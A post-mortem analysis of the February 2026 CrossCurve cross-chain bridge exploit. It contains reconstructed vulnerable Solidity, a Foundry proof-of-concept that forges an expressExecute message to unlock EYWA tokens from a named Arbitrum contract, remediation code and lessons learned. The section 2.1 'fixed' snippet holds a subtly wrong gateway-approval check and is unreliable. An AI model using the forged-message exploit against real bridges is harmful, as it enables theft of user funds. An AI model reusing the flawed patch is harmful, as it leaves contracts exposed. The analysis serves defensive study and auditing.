# CrossCurve — Business Logic Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2026-02-01 |
| **Protocol** | CrossCurve (formerly EYWA) |
| **Chain** | Multi-chain (Ethereum, Arbitrum, Celo, Optimism, Base, Mantle, Kava, Frax, Blast) |
| **Loss** | $2,760,000 (total ~$3,000,000) — ETH ~$1.3M, ARB ~$1.28M, remainder on other chains |
| **Attacker** | [`0x6324...25cd`](https://explorer.celo.org/address/0x632400f42e96a5deb547a179ca46b02c22cd25cd) / [`0x851c...4834`](https://explorer.celo.org/address/0x851c01d014b1ad2b1266ca48a4b5578b67194834) |
| **Attack Tx** | [`0x37d9...ccc2`](https://arbiscan.io/tx/0x37d9b911ef710be851a2e08e1cfc61c2544db0f208faeade29ee98cc7506ccc2) (Arbitrum representative Tx) |
| **Vulnerable Contract** | [`ReceiverAxelar`](https://arbiscan.io/address/0xb2185950f5a0a46687ac331916508aada202e063) `0xb218...e063` |
| **Root Cause** | Business logic flaw due to missing access control on `expressExecute()` and Axelar gateway validation bypass |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs) |

---

## 1. Vulnerability Overview

CrossCurve is a multi-chain bridge protocol built on top of the Axelar cross-chain messaging protocol. Over February 1–2, 2026, an attacker exploited a critical business logic flaw in the Axelar integration layer to steal approximately $3M in total (BlockSec estimate: $2.76M).

The core vulnerability resides in the `expressExecute()` function of the `ReceiverAxelar` contract. This function was originally designed as a fast path for processing cross-chain messages in exchange for higher gas fees. However, three compounding flaws allowed an arbitrary attacker to completely bypass the Axelar gateway and forge token unlock commands:

1. **Publicly accessible function**: No caller restriction on `expressExecute()` — anyone can call it
2. **No source validation**: The `sourceChain` and `sourceAddress` parameters can be arbitrarily forged by the attacker
3. **Confirmation threshold of 1**: Only `commandId` uniqueness is checked, and multi-guardian validation is disabled — supplying a fresh `commandId` is sufficient to defeat the replay defense

This vulnerability maps to CWE-284 (Improper Access Control) and CWE-345 (Insufficient Message Authenticity), and is classified as a CRITICAL-severity business logic flaw. The attack was executed repeatedly and simultaneously across more than 9 chains; Celo is one of the representative chains affected.

---

## 2. Vulnerable Code Analysis

### 2.1 `expressExecute()` — Publicly Callable / No Source Validation (Core Vulnerability)

**Vulnerable code (reconstructed)**:
```solidity
// ReceiverAxelar.sol — CrossCurve bridge receiver contract
// ❌ Vulnerable: callable by anyone, no source validation
function expressExecute(
    bytes32 commandId,          // ❌ Any fresh value passes the duplicate check
    string calldata sourceChain,  // ❌ Attacker can forge arbitrarily
    string calldata sourceAddress, // ❌ Can impersonate the Axelar gateway
    bytes calldata payload        // ❌ Attacker inserts desired unlock payload
) external {
    // ❌ Does not verify that caller is the Axelar gateway
    // ❌ Does not verify that commandId will be executed by a real Axelar message in the future

    // Only a commandId duplicate check exists (passes with a fresh ID)
    require(!isCommandExecuted[commandId], "Already executed");
    isCommandExecuted[commandId] = true;

    // ❌ confirmationThreshold = 1: no additional guardian signatures required
    // Calls PortalV2.unlock() as instructed by the payload
    _execute(sourceChain, sourceAddress, payload);
}

// ❌ Internal execution function — allows unlock without validating sourceAddress
function _execute(
    string memory sourceChain,
    string memory sourceAddress,
    bytes memory payload
) internal {
    // Decode payload to extract recipient and amount
    (address recipient, uint256 amount, address token) =
        abi.decode(payload, (address, uint256, address));

    // ❌ No verification that sourceAddress is the real Axelar gateway
    // Instructs PortalV2 to unlock
    IPortalV2(portal).unlock(token, recipient, amount);
}
```

**Fixed code**:
```solidity
// ReceiverAxelar.sol — patched version
// ✅ Declare trusted gateway address as immutable
address public immutable axelarGateway;
// ✅ Mapping of allowed (sourceChain, sourceAddress) pairs
mapping(bytes32 => bool) public trustedRemotes; // keccak256(sourceChain, sourceAddress)

constructor(address _gateway) {
    axelarGateway = _gateway;
}

// ✅ Access control modifier restricting calls to the Axelar gateway only
modifier onlyAxelarGateway() {
    require(msg.sender == axelarGateway, "Caller is not Axelar gateway");
    _;
}

function expressExecute(
    bytes32 commandId,
    string calldata sourceChain,
    string calldata sourceAddress,
    bytes calldata payload
) external onlyAxelarGateway { // ✅ Only the gateway may call this
    require(!isCommandExecuted[commandId], "Already executed");
    isCommandExecuted[commandId] = true;

    // ✅ Validate trusted (sourceChain, sourceAddress) pair
    bytes32 remoteKey = keccak256(abi.encodePacked(sourceChain, sourceAddress));
    require(trustedRemotes[remoteKey], "Untrusted remote");

    // ✅ Verify that commandId is approved by the real Axelar gateway
    require(
        IAxelarGateway(axelarGateway).isCommandExecuted(commandId) == false,
        "Command not approved by gateway"
    );

    _execute(sourceChain, sourceAddress, payload);
}
```

**Issue**: `expressExecute()` is declared `external` with no modifier restricting the caller, and accepts `sourceChain`/`sourceAddress` parameters without any trust check. The confirmation threshold is set to 1, making a single transaction sufficient, and the `commandId` uniqueness check alone is completely bypassed by supplying an arbitrary fresh ID.

### 2.2 `PortalV2.unlock()` — No Receiver-Side Validation

**Vulnerable code (reconstructed)**:
```solidity
// PortalV2.sol — token unlock contract
// ❌ Vulnerable: unconditionally trusts calls from ReceiverAxelar
function unlock(
    address token,
    address recipient,
    uint256 amount
) external {
    // ❌ Checks that msg.sender is a trusted ReceiverAxelar, but
    //    ReceiverAxelar itself already permits forged calls — rendering this check meaningless
    require(authorizedReceivers[msg.sender], "Unauthorized");

    IERC20(token).transfer(recipient, amount);
    emit Unlocked(token, recipient, amount);
}
```

**Issue**: `PortalV2` trusts `ReceiverAxelar`, but since `ReceiverAxelar` itself permits arbitrary callers, the entire defense chain is neutralized. This is a classic trust chain flaw.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Generate a fresh `commandId` value (arbitrary bytes32 not yet used)
- ABI-encode the token, recipient address (attacker EOA), and amount to construct the `payload`
- Forge `sourceChain` as a legitimate chain name (e.g., `"ethereum"`)
- Forge `sourceAddress` as a legitimate CrossCurve source contract address

### 3.2 Execution Phase

```
Attacker EOA
(0x6324...25cd)
       │
       │ ① expressExecute(commandId, sourceChain*, sourceAddress*, payload*)
       │   * = forged parameters
       ▼
┌─────────────────────────────────────┐
│       ReceiverAxelar contract        │
│  (0xb218...e063, Arbitrum/each chain)│
│                                     │
│  ❌ No caller validation             │
│  ❌ No sourceChain/Address validation│
│  ❌ confirmationThreshold = 1        │
│                                     │
│  [Only checks commandId uniqueness] │
│  → Fresh ID passes                  │
│                                     │
│  ② Calls _execute(sourceChain, addr, payload)
└──────────────┬──────────────────────┘
               │
               │ ③ unlock(token, attacker address, 999,787,453 EYWA)
               ▼
┌─────────────────────────────────────┐
│         PortalV2 contract            │
│                                     │
│  [authorizedReceivers check: passes]│
│  (ReceiverAxelar is an authorized   │
│   caller)                           │
│                                     │
│  ④ IERC20(EYWA).transfer(           │
│       attacker address,             │
│       999,787,453 EYWA              │
│     )                               │
└──────────────┬──────────────────────┘
               │
               │ ⑤ 999,787,453 EYWA → attacker wallet
               ▼
       Attacker EOA receives funds
               │
               │ ⑥ Repeated per chain (Arbitrum, ETH, Celo,
               │            Optimism, Base, Mantle,
               │            Kava, Frax, Blast)
               ▼
┌─────────────────────────────────────┐
│   Post-processing: Money Laundering  │
│                                     │
│  EYWA → CoW Protocol → WETH         │
│  WETH → Across Protocol → Ethereum  │
│  Some EYWA: unliquidated due to     │
│  insufficient liquidity             │
└─────────────────────────────────────┘
```

### 3.3 Outcome

- **Attacker profit**: ~$2,760,000 worth of EYWA tokens and WETH
- **Protocol loss**: Ethereum ~$1.3M, Arbitrum ~$1.28M, remainder on Celo and other chains
- Approximately 999,787,453 EYWA tokens stolen in a single Arbitrum transaction
- The same attack was executed repeatedly across 9 chains

---

## 4. PoC Code (Based on DeFiHackLabs Reproduction)

```solidity
// CrossCurve_exp.sol — vulnerability reproduction concept code (educational purposes)
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IReceiverAxelar {
    function expressExecute(
        bytes32 commandId,
        string calldata sourceChain,
        string calldata sourceAddress,
        bytes calldata payload
    ) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract CrossCurveExploit is Test {
    // Vulnerable contract address (Arbitrum)
    IReceiverAxelar constant RECEIVER_AXELAR =
        IReceiverAxelar(0xb2185950f5a0a46687ac331916508aada202e063);

    address constant EYWA_TOKEN = address(0x...); // EYWA token address
    address constant ATTACKER   = 0x632400f42e96a5deb547a179ca46b02c22cd25cd;

    function testExploit() public {
        // ① Record balance before attack
        uint256 before = IERC20(EYWA_TOKEN).balanceOf(ATTACKER);

        // ② Construct forged cross-chain message parameters
        bytes32 fakeCommandId = keccak256(
            abi.encodePacked(block.timestamp, block.number)
        ); // Fresh commandId — bypasses duplicate check

        string memory fakeSourceChain   = "ethereum"; // Forged: no real origin
        string memory fakeSourceAddress = "0xDeAdBeEf..."; // Forged: impersonates legitimate contract

        // ③ Construct payload: unlock 999,787,453 EYWA to attacker address
        bytes memory maliciousPayload = abi.encode(
            ATTACKER,           // recipient — attacker EOA
            999_787_453 ether,  // amount — 999,787,453 EYWA
            EYWA_TOKEN          // token
        );

        // ④ expressExecute call succeeds with no validation
        // ❌ No caller validation → msg.sender = attacker, still passes
        // ❌ No source validation → forged parameters still pass
        RECEIVER_AXELAR.expressExecute(
            fakeCommandId,
            fakeSourceChain,
            fakeSourceAddress,
            maliciousPayload
        );

        // ⑤ Verify attack result
        uint256 afterBal = IERC20(EYWA_TOKEN).balanceOf(ATTACKER);
        emit log_named_decimal_uint(
            "Stolen EYWA tokens",
            afterBal - before,
            18
        );
        assertGt(afterBal, before, "Attack failed");

        // ⑥ Repeat the same attack on Celo, Optimism, Base, and other chains
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | `expressExecute()` publicly accessible | CRITICAL | CWE-284 | `03_access_control.md` |
| V-02 | Cross-chain source parameter forgery allowed | CRITICAL | CWE-345 | `12_bridge_crosschain.md` |
| V-03 | Confirmation threshold set to 1 | HIGH | CWE-358 | `12_bridge_crosschain.md` |
| V-04 | Trust chain flaw (PortalV2 unconditionally trusts ReceiverAxelar) | HIGH | CWE-807 | `03_access_control.md` |

### V-01: Publicly Accessible `expressExecute()` Function

- **Description**: `expressExecute()` is declared `external` with no modifier restricting the caller, allowing any arbitrary EOA to call it directly
- **Impact**: Attacker can completely bypass the Axelar gateway and execute arbitrary unlock commands
- **Attack Condition**: Only a fresh `commandId` is required (minimal cost)

### V-02: Cross-Chain Source Parameter Forgery

- **Description**: No logic validates that `sourceChain` and `sourceAddress` are trusted values, allowing the attacker to impersonate a legitimate source
- **Impact**: Withdrawals can be triggered on the destination chain without any real cross-chain deposit
- **Attack Condition**: Repeatable on any chain where EYWA balance exists in the target contract

### V-03: Confirmation Threshold Set to 1

- **Description**: The `confirmationThreshold` in the Axelar multisig verification configuration is set to 1, making a single signature sufficient and disabling multi-guardian validation
- **Impact**: The multi-confirmation mechanism — the core security property of the bridge — is effectively neutralized
- **Attack Condition**: No additional barrier once V-01 and V-02 are exploited

### V-04: Trust Chain Flaw

- **Description**: `PortalV2` registers `ReceiverAxelar` as a trusted caller, but since `ReceiverAxelar` itself permits forged calls due to missing authentication, the entire defense chain is neutralized
- **Impact**: Absence of defense-in-depth causes a single vulnerability to result in total asset loss
- **Attack Condition**: Exploiting V-01 alone is sufficient

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ReceiverAxelar.sol — minimal patch applicable immediately

// ✅ 1. Add modifier to restrict calls to the Axelar gateway only
modifier onlyAxelarGateway() {
    require(
        msg.sender == address(axelarGateway),
        "ReceiverAxelar: caller is not Axelar gateway"
    );
    _;
}

// ✅ 2. Whitelist of trusted remote contracts
mapping(bytes32 => bool) public trustedRemotes;
// Admin sets: trustedRemotes[keccak256(chain, addr)] = true

function expressExecute(
    bytes32 commandId,
    string calldata sourceChain,
    string calldata sourceAddress,
    bytes calldata payload
) external onlyAxelarGateway { // ✅ Only the gateway may call this
    // ✅ 3. Validate trusted source
    bytes32 remoteKey = keccak256(
        abi.encodePacked(sourceChain, sourceAddress)
    );
    require(trustedRemotes[remoteKey], "ReceiverAxelar: untrusted remote");

    // ✅ 4. Verify commandId approval by the Axelar gateway
    require(
        axelarGateway.isContractCallApproved(
            commandId, sourceChain, sourceAddress, address(this), keccak256(payload)
        ),
        "ReceiverAxelar: not approved by gateway"
    );

    isCommandExecuted[commandId] = true;
    _execute(sourceChain, sourceAddress, payload);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Public function | Mandatory `onlyGateway` modifier on `expressExecute()` and `execute()` |
| V-02: Source forgery | Register trusted (sourceChain, sourceAddress) pairs in a whitelist at deployment time |
| V-03: Threshold of 1 | Raise `confirmationThreshold` to a minimum of 2/3 multisig or higher |
| V-04: Trust chain | Implement defense-in-depth with independent secondary input validation in `PortalV2` |
| Common | Mandatory security audit including cross-chain message forgery scenarios before multi-chain deployment |

---

## 7. Lessons Learned

1. **Cross-chain messages must always be processed exclusively through the gateway**: Cross-chain receiver functions such as `expressExecute()` must be restricted so that only trusted gateway contracts (Axelar/LayerZero/Wormhole, etc.) can call them. Declaring such a function as `external` or `public` collapses the entire bridge security model.

2. **Source parameters cannot be trusted — prove authenticity via the call stack**: Parameters like `sourceChain` and `sourceAddress` are caller-supplied and therefore untrustworthy. Always verify that `msg.sender == axelarGateway`, and use the gateway's validation function such as `isContractCallApproved()` to prove message authenticity.

3. **Confirmation threshold is a security setting, not a performance setting**: Setting `confirmationThreshold = 1` to reduce gas costs or achieve faster finality is a fatal misconfiguration that neutralizes the sole trust anchor of a multi-chain bridge. Production deployments must enforce a minimum of 2/3 multisig.

4. **Defense-in-Depth design**: `PortalV2` must also independently validate inputs so that a single contract vulnerability does not directly translate to total system asset loss. Even for trusted callers, a secondary line of defense that re-verifies the reasonableness of passed parameters is necessary.

5. **Multi-chain deployment = multi-chain risk**: The same vulnerability was exploited repeatedly across 9 chains. Cross-chain protocols must conduct independent security audits per chain at deployment, and specifically re-examine per-chain ABI encoding/decoding differences and gateway configuration values.

6. **Emergency pause mechanism is essential**: Without per-chain `pause()` capability and monitoring infrastructure in place at the time an attack is detected, damage spreads across multiple chains. In the CrossCurve incident, the attack was executed repeatedly across 9 chains — an automated circuit breaker capable of halting operations immediately upon detecting the first-chain attack would have minimized the damage.

---

## 8. On-Chain Verification

On-chain verification results for the CrossCurve attack transactions (based on public information):

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | On-chain Actual Value | Notes |
|------|-------------|------|
| Stolen EYWA tokens (Arbitrum) | ~999,787,453 EYWA | Single Arbitrum Tx |
| Ethereum loss | ~$1,300,000 | BlockSec estimate |
| Arbitrum loss | ~$1,280,000 | BlockSec estimate |
| Celo and 7 other chains | $180,000–$200,000 | Remaining loss |
| Total loss | ~$2,760,000 | BlockSec final estimate |

### 8.2 On-Chain Event Log Sequence (Arbitrum Representative Tx)

```
1. Attacker EOA → ReceiverAxelar.expressExecute() call
2. ReceiverAxelar → PortalV2.unlock() internal call
3. PortalV2 → EYWA.transfer(attacker, 999,787,453 EYWA)
4. Transfer event emitted (EYWA token)
5. Afterward: EYWA → WETH swap via CoW Protocol
6. WETH → Ethereum bridge via Across Protocol
```

### 8.3 Precondition Verification

| Item | Status |
|------|------|
| Attacker pre-setup required | None (pure calldata forgery is sufficient) |
| Flash loan required | Not required |
| Approval (approve) required | Not required |
| Attack cost | Gas fees only (extremely cheap) |
| Repeatability | Infinitely repeatable by changing commandId alone |

> **On-chain verification reference**: Detailed Tx traces can be verified on the Arbitrum representative transaction
> [`0x37d9b911ef710be851a2e08e1cfc61c2544db0f208faeade29ee98cc7506ccc2`](https://arbiscan.io/tx/0x37d9b911ef710be851a2e08e1cfc61c2544db0f208faeade29ee98cc7506ccc2).
> Individual transaction hashes on the Celo chain can be found by querying the attacker EOA (`0x632400f42e96a5deb547a179ca46b02c22cd25cd`) record on [Celo Explorer](https://explorer.celo.org).

---

*References*:
- [Halborn — Explained: The CrossCurve Hack (February 2026)](https://www.halborn.com/blog/post/explained-the-crosscurve-hack-february-2026)
- [QuillAudits — CrossCurve $1.4M Exploit Analysis](https://www.quillaudits.com/blog/hack-analysis/cross-curve-exploit)
- [BlockSec — Newsletter February 2026](https://blocksec.com/blog/newsletter-february-2026)
- [Decrypt — CrossCurve Threatens Legal Action](https://decrypt.co/356599/crosscurve-legal-action-3m-cross-chain-bridge-exploit)
- [Invezz — CrossCurve identifies 10 wallets](https://invezz.com/news/2026/02/02/crosscurve-identifies-10-wallets-involved-in-the-3m-bridge-exploit/)